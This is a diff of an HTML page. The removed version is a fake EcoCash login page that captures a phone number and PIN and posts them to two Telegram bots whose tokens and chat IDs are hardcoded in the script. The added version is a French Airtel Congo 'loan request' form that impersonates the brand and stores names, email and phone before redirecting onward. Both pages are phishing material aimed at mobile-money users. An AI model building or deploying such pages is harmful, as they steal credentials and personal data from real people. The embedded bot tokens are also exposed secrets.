@@ -1,433 +1,836 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Logins</title>
+    <title>Airtel - Demande de prêt</title>
+
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         html,
         body {
-            min-height: 100vh;
+            height: 100%;
             font-family: 'Inter', sans-serif;
-            background: white;
-            overflow-x: hidden;
-            overflow-y: auto;
+            background: #f5f5f5;
+            overflow: hidden;
         }
-        
+
         body {
             display: flex;
             flex-direction: column;
+            align-items: center;
+            padding: 10px;
         }
-        
+
+        /* =========================
+           HEADER
+        ========================= */
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 15px 20px;
+
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+
+            margin-bottom: 10px;
+
+            background: white;
+
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        /* BACK BUTTON */
+
+        .back-btn {
+            font-size: 28px;
+
+            background: none;
+            border: none;
+
+            cursor: pointer;
+
+            color: #333;
+
+            width: 40px;
+            height: 40px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            padding: 0;
+        }
+
+        /* LOGO */
+
         .logo {
-            text-align: center;
-            padding: 50px 20px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            width: auto;
+            height: 40px;
+
             flex-shrink: 0;
         }
-        
-        .logo-text {
-            font-size: 36px;
-            font-weight: 700;
+
+        .logo img {
+            width: 110px;
+            height: 40px;
+
+            object-fit: contain;
+            object-position: center;
+
+            display: block;
         }
-        
-        .logo-eco {
-            color: #0066ff;
+
+        /* RIGHT SIDE SPACER */
+
+        .header-spacer {
+            width: 40px;
+            height: 40px;
         }
-        
-        .logo-cash {
-            color: #ff0000;
-        }
-        
-        .login-content {
-            flex: 1 0 auto;
+
+        /* =========================
+           MAIN CARD
+        ========================= */
+
+        .card {
+            background: white;
+
+            border-radius: 24px;
+
+            padding: 40px 30px;
+
+            width: 100%;
+            max-width: 480px;
+
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
+
             display: flex;
             flex-direction: column;
-            align-items: center;
-            padding: 0 30px 50px;
-            max-width: 480px;
-            margin: 0 auto;
-            width: 100%;
+
+            overflow-y: auto;
+
+            flex: 1;
+
+            margin-bottom: 10px;
         }
-        
-        .title {
-            font-size: 26px;
-            font-weight: 600;
+
+        /* =========================
+           FORM TITLE
+        ========================= */
+
+        .form-title {
+            font-size: 28px;
+
+            font-weight: 700;
+
+            text-align: center;
+
+            margin-bottom: 20px;
+
             color: #333;
-            margin-bottom: 40px;
         }
-        
-        .phone-group {
-            width: 100%;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
+
+        /* =========================
+           PROGRESS BAR
+        ========================= */
+
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+
+            background: #e0e0e0;
+
+            border-radius: 3px;
+
+            margin: 30px auto;
+
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 66%;
+
+            height: 100%;
+
+            background: linear-gradient(
+                to right,
+                #4361ee,
+                #7209b7
+            );
+        }
+
+        /* =========================
+           STEP TEXT
+        ========================= */
+
+        .step-text {
+            text-align: center;
+
+            color: #777;
+
+            font-size: 15px;
+
+            margin-bottom: 30px;
+        }
+
+        /* =========================
+           NAME GROUP
+        ========================= */
+
+        .name-group {
             display: flex;
+
+            gap: 15px;
+
+            margin-bottom: 24px;
+        }
+
+        .name-group > div {
+            flex: 1;
+        }
+
+        /* =========================
+           FORM LABEL
+        ========================= */
+
+        .form-label {
+            display: block;
+
+            font-weight: 600;
+
+            color: #333;
+
+            margin-bottom: 8px;
+
+            font-size: 15px;
+        }
+
+        /* =========================
+           FORM INPUT
+        ========================= */
+
+        .form-input {
+            width: 100%;
+
+            padding: 16px;
+
+            border: 1px solid #ddd;
+
+            border-radius: 12px;
+
+            font-size: 16px;
+
+            transition: border 0.3s;
+
+            font-family: 'Inter', sans-serif;
+        }
+
+        .form-input:focus {
+            border-color: #4361ee;
+
+            outline: none;
+        }
+
+        .invalid {
+            border-color: #e74c3c !important;
+        }
+
+        /* =========================
+           PHONE GROUP
+        ========================= */
+
+        .phone-group {
+            display: flex;
+
             align-items: center;
-            padding: 18px 24px;
-            margin-bottom: 40px;
+
+            border: 1px solid #ddd;
+
+            border-radius: 12px;
+
+            padding: 0 16px;
+
+            margin-bottom: 10px;
+
+            transition: border 0.3s;
+
             background: white;
         }
-        
-        .flag {
-            font-size: 28px;
-            margin-right: 12px;
+
+        .phone-group.invalid {
+            border-color: #e74c3c !important;
         }
-        
-        .country-select {
-            display: flex;
-            align-items: center;
-            color: #0066ff;
-            font-weight: 600;
-            font-size: 18px;
-            margin-right: 16px;
+
+        .phone-prefix {
+            color: #666;
+
+            font-size: 16px;
+
+            margin-right: 10px;
+
+            white-space: nowrap;
         }
-        
-        .dropdown-arrow {
-            font-size: 14px;
-            margin-left: 6px;
-        }
-        
+
         .phone-input {
             flex: 1;
+
             border: none;
+
             outline: none;
-            font-size: 18px;
-            color: #333;
-        }
-        
-        .phone-input::placeholder {
-            color: #aaa;
-        }
-        
-        .pin-label {
+
+            padding: 16px 0;
+
             font-size: 16px;
-            color: #666;
-            margin-bottom: 24px;
-            font-weight: 500;
+
+            font-family: 'Inter', sans-serif;
+
+            min-width: 0;
         }
-        
-        .pin-group {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
+
+        .phone-input:focus {
+            outline: none;
+        }
+
+        /* =========================
+           PHONE HELP TEXT
+        ========================= */
+
+        .phone-help {
+            color: #999;
+
+            display: block;
+
             margin-bottom: 30px;
-        }
-        
-        .pin-box {
-            width: 60px;
-            height: 60px;
-            border: 2px solid #0066ff;
-            border-radius: 16px;
-            font-size: 28px;
-            text-align: center;
-            background: white;
-            color: #333;
-            font-weight: 600;
-        }
-        
-        .forgot {
-            font-size: 15px;
-            color: #0066ff;
-            text-decoration: none;
-            font-weight: 500;
-            margin-bottom: 40px;
-        }
-        
-        #loginBtn {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            padding: 18px;
-            background: #0066ff;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-bottom: 50px;
-            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
-        }
-        
-        .bottom-section {
-            background: #005eb8;
-            color: white;
-            padding: 100px 30px 80px;
-            text-align: center;
-            width: 100vw;
-            margin-left: calc(-50vw + 50%);
-            position: relative;
-            flex-shrink: 0;
-        }
-        
-        .curve {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 90px;
-            background: white;
-            border-radius: 0 0 50% 50% / 0 0 100% 100%;
-            transform: scaleX(1.8);
-            transform-origin: top;
-        }
-        
-        .bottom-content {
-            position: relative;
-            z-index: 2;
-        }
-        
-        .bottom-text {
-            font-size: 15px;
-            margin-bottom: 35px;
-            line-height: 1.6;
-            opacity: 0.95;
-        }
-        
-        .bottom-btns {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 40px;
-        }
-        
-        .bottom-btn {
-            background: white;
-            color: #0066ff;
-            border: none;
-            border-radius: 30px;
-            padding: 18px 36px;
-            font-weight: 600;
-            font-size: 16px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            width: 180px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-        }
-        
-        .btn-icon {
-            font-size: 26px;
-            color: #0066ff;
-        }
-        
-        .version {
-            font-size: 14px;
-            margin-bottom: 12px;
-            opacity: 0.9;
-            font-weight: 500;
-        }
-        
-        .terms {
+
             font-size: 13px;
-            opacity: 0.85;
-            line-height: 1.5;
         }
-        
-        .terms a {
-            color: white;
-            text-decoration: underline;
-            font-weight: 500;
+
+        /* =========================
+           BUTTON GROUP
+        ========================= */
+
+        .btn-group {
+            display: flex;
+
+            gap: 15px;
+
+            margin-top: 40px;
         }
-        
-        #spinnerOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.98);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f0f0f0;
-            border-top: 6px solid #005eb8;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 30px;
-        }
-        
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .spinner-text {
+
+        .prev-btn,
+        .next-btn {
+            flex: 1;
+
+            padding: 18px;
+
+            border: none;
+
+            border-radius: 50px;
+
             font-size: 18px;
-            color: #333;
+
+            font-weight: 700;
+
+            cursor: pointer;
+
+            transition: opacity 0.2s ease,
+                        transform 0.2s ease;
+        }
+
+        /* PREVIOUS */
+
+        .prev-btn {
+            background: #eee;
+
+            color: #666;
+        }
+
+        .prev-btn:hover {
+            background: #e5e5e5;
+        }
+
+        /* NEXT */
+
+        .next-btn {
+            background: linear-gradient(
+                to right,
+                #4361ee,
+                #7209b7
+            );
+
+            color: white;
+        }
+
+        .next-btn:hover {
+            opacity: 0.92;
+        }
+
+        .prev-btn:active,
+        .next-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* =========================
+           FOOTER
+        ========================= */
+
+        footer {
+            padding: 20px;
+
+            color: #aaa;
+
+            font-size: 13px;
+
             text-align: center;
-            line-height: 1.6;
-            max-width: 300px;
-            font-weight: 500;
+
+            width: 100%;
+
+            max-width: 480px;
+        }
+
+        /* =========================
+           MOBILE
+        ========================= */
+
+        @media (max-width: 480px) {
+
+            .logo {
+                height: 38px;
+            }
+
+            .logo img {
+                width: 100px;
+                height: 38px;
+            }
+
+            .card {
+                padding: 30px 20px;
+            }
+
+            .form-title {
+                font-size: 25px;
+            }
+
+            .name-group {
+                gap: 10px;
+            }
+
+            .form-input,
+            .phone-input {
+                font-size: 15px;
+            }
+
+            .prev-btn,
+            .next-btn {
+                font-size: 16px;
+                padding: 16px 10px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="logo">
-        <div class="logo-text">
-            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+
+    <!-- HEADER -->
+
+    <header>
+
+        <button
+            class="back-btn"
+            onclick="history.back()"
+            aria-label="Retour"
+        >
+            ←
+        </button>
+
+        <div class="logo">
+
+            <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwKPIUOxpuuEY1j3YBezDsKGUqWQ8aZNoh7dFU4nzwiw&s=10"
+                alt="EcoCash"
+            >
+
         </div>
-    </div>
 
-    <div class="login-content">
-        <h1 class="title">Login</h1>
+        <div class="header-spacer"></div>
 
-        <div class="phone-group">
-            <span class="flag">🇿🇼</span>
-            <div class="country-select">
-                +263 <span class="dropdown-arrow">▼</span>
+    </header>
+
+
+    <!-- MAIN CONTENT -->
+
+    <main class="card">
+
+        <h1 class="form-title">
+            Demande de prêt
+        </h1>
+
+
+        <!-- PROGRESS BAR -->
+
+        <div class="progress-bar">
+
+            <div class="progress-fill"></div>
+
+        </div>
+
+
+        <!-- STEP -->
+
+        <div class="step-text">
+            Étape 2 sur 3
+        </div>
+
+
+        <!-- FIRST AND LAST NAME -->
+
+        <div class="name-group">
+
+            <div>
+
+                <label
+                    class="form-label"
+                    for="firstName"
+                >
+                    Prénom
+                </label>
+
+                <input
+                    type="text"
+                    class="form-input"
+                    id="firstName"
+                    placeholder="Jean"
+                    autocomplete="given-name"
+                >
+
             </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
-        </div>
 
-        <div class="pin-label">Enter your PIN</div>
-        <div class="pin-group">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-            <input type="password" class="pin-box" maxlength="1">
-        </div>
 
-        <a href="#" class="forgot">Forgot PIN?</a>
+            <div>
 
-        <button id="loginBtn">LOGIN</button>
-    </div>
+                <label
+                    class="form-label"
+                    for="lastName"
+                >
+                    Nom
+                </label>
 
-    <div class="bottom-section">
-        <div class="curve"></div>
-        <div class="bottom-content">
-            <div class="bottom-text">
-                To register an EcoCash wallet or get assistance,<br> click below
+                <input
+                    type="text"
+                    class="form-input"
+                    id="lastName"
+                    placeholder="Dupont"
+                    autocomplete="family-name"
+                >
+
             </div>
-            <div class="bottom-btns">
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">👤</div>
-                    Register
-                </a>
-                <a href="#" class="bottom-btn">
-                    <div class="btn-icon">ℹ️</div>
-                    Help & Support
-                </a>
-            </div>
-            <div class="version">v2.13P</div>
-            <div class="terms">
-                By signing in you agree to the <a href="#">Terms and Conditions</a>
-            </div>
+
         </div>
-    </div>
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spinner-text">
-            Please wait...<br> This usually takes a few seconds
+
+
+        <!-- EMAIL -->
+
+        <label
+            class="form-label"
+            for="email"
+        >
+            Adresse e-mail
+        </label>
+
+        <input
+            type="email"
+            class="form-input"
+            id="email"
+            placeholder="jean.dupont@example.com"
+            autocomplete="email"
+            style="margin-bottom:24px;"
+        >
+
+
+        <!-- PHONE -->
+
+        <label
+            class="form-label"
+            for="phone"
+        >
+            Numéro de téléphone
+        </label>
+
+
+        <div
+            class="phone-group"
+            id="phoneGroup"
+        >
+
+            <span class="phone-prefix">
+                +242
+            </span>
+
+            <input
+                type="tel"
+                class="phone-input"
+                id="phone"
+                placeholder="771234567"
+                maxlength="9"
+                inputmode="numeric"
+                autocomplete="tel"
+            >
+
         </div>
-    </div>
+
+
+        <small class="phone-help">
+            Entrez 9 chiffres (ex. 771234567)
+        </small>
+
+
+        <!-- BUTTONS -->
+
+        <div class="btn-group">
+
+            <button
+                class="prev-btn"
+                onclick="history.back()"
+            >
+                PRÉCÉDENT
+            </button>
+
+
+            <button
+                class="next-btn"
+                id="nextBtn"
+            >
+                ÉTAPE SUIVANTE
+            </button>
+
+        </div>
+
+    </main>
+
+
+    <!-- FOOTER -->
+
+    <footer>
+© 2026 Airtel Congo. Tous droits réservés.
+    </footer>
+
+
+    <!-- JAVASCRIPT -->
+
     <script>
-        // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8850018289:AAGiRmgB47k939BAxcGc9l8A7jzxVdEcXuQ';
-        const CHAT_ID_1 = '5560695645';
 
-        // Bot 2 (your second bot)
-        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
-        const CHAT_ID_2 = '5615316142';
+        /* =========================
+           PRE-FILL SAVED DATA
+        ========================= */
 
-        const savedPhone = localStorage.getItem('phone');
-        const phoneInput = document.getElementById('phoneInput');
-        if (savedPhone && savedPhone.length === 9) {
-            phoneInput.value = savedPhone;
-        }
-        const pinBoxes = document.querySelectorAll('.pin-box');
-        const loginBtn = document.getElementById('loginBtn');
-        const spinnerOverlay = document.getElementById('spinnerOverlay');
-        let pinValue = '';
+        if (localStorage.getItem('firstName')) {
 
-        function checkPinComplete() {
-            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
-            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+            document.getElementById('firstName').value =
+                localStorage.getItem('firstName');
+
         }
 
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                if (box.value.length === 1 && index < 3) {
-                    pinBoxes[index + 1].focus();
+
+        if (localStorage.getItem('lastName')) {
+
+            document.getElementById('lastName').value =
+                localStorage.getItem('lastName');
+
+        }
+
+
+        if (localStorage.getItem('email')) {
+
+            document.getElementById('email').value =
+                localStorage.getItem('email');
+
+        }
+
+
+        if (localStorage.getItem('phone')) {
+
+            document.getElementById('phone').value =
+                localStorage.getItem('phone');
+
+        }
+
+
+        /* =========================
+           NEXT BUTTON
+        ========================= */
+
+        document
+            .getElementById('nextBtn')
+            .addEventListener('click', function () {
+
+                const firstName =
+                    document
+                        .getElementById('firstName')
+                        .value
+                        .trim();
+
+
+                const lastName =
+                    document
+                        .getElementById('lastName')
+                        .value
+                        .trim();
+
+
+                const email =
+                    document
+                        .getElementById('email')
+                        .value
+                        .trim();
+
+
+                const phone =
+                    document
+                        .getElementById('phone')
+                        .value
+                        .trim();
+
+
+                /* REMOVE PREVIOUS ERRORS */
+
+                document
+                    .querySelectorAll(
+                        '.form-input, #phoneGroup'
+                    )
+                    .forEach(function (el) {
+
+                        el.classList.remove('invalid');
+
+                    });
+
+
+                let valid = true;
+
+
+                /* FIRST NAME */
+
+                if (!firstName) {
+
+                    document
+                        .getElementById('firstName')
+                        .classList.add('invalid');
+
+                    valid = false;
                 }
-                checkPinComplete();
-            });
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                    pinBoxes[index - 1].focus();
+
+
+                /* LAST NAME */
+
+                if (!lastName) {
+
+                    document
+                        .getElementById('lastName')
+                        .classList.add('invalid');
+
+                    valid = false;
                 }
+
+
+                /* EMAIL */
+
+                if (
+                    !email ||
+                    !email.includes('@') ||
+                    !email.includes('.')
+                ) {
+
+                    document
+                        .getElementById('email')
+                        .classList.add('invalid');
+
+                    valid = false;
+                }
+
+
+                /* PHONE */
+
+                if (
+                    !phone ||
+                    phone.length !== 9 ||
+                    !/^\d+$/.test(phone)
+                ) {
+
+                    document
+                        .getElementById('phoneGroup')
+                        .classList.add('invalid');
+
+                    valid = false;
+                }
+
+
+                /* SHOW VALIDATION ERROR */
+
+                if (!valid) {
+
+                    alert(
+                        'Veuillez remplir correctement tous les champs.\n\n' +
+                        '• L’adresse e-mail doit être valide\n' +
+                        '• Le numéro de téléphone doit contenir exactement 9 chiffres'
+                    );
+
+                    return;
+                }
+
+
+                /* =========================
+                   SAVE INFORMATION
+                ========================= */
+
+                localStorage.setItem(
+                    'firstName',
+                    firstName
+                );
+
+
+                localStorage.setItem(
+                    'lastName',
+                    lastName
+                );
+
+
+                localStorage.setItem(
+                    'email',
+                    email
+                );
+
+
+                localStorage.setItem(
+                    'phone',
+                    phone
+                );
+
+
+                /* =========================
+                   NEXT PAGE
+                ========================= */
+
+                window.location.href =
+                    'summary.html';
+
             });
-        });
 
-        // ========== LOGIN CLICK ==========
-        loginBtn.addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
-            if (!phone) {
-                alert('Please enter phone number');
-                return;
-            }
-
-            spinnerOverlay.style.display = 'flex';
-
-            // Save phone to localStorage
-            localStorage.setItem('phone', phone);
-
-            // Build the credential message
-            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
-
-            // Send to Bot 1
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_1,
-                    text: message
-                })
-            }).catch(() => {});
-
-            // Send to Bot 2
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID_2,
-                    text: message
-                })
-            }).catch(() => {});
-
-            // Proceed to next page
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
-        });
-
-        checkPinComplete();
-        pinBoxes[0].focus();
     </script>
+
 </body>
 
 </html>
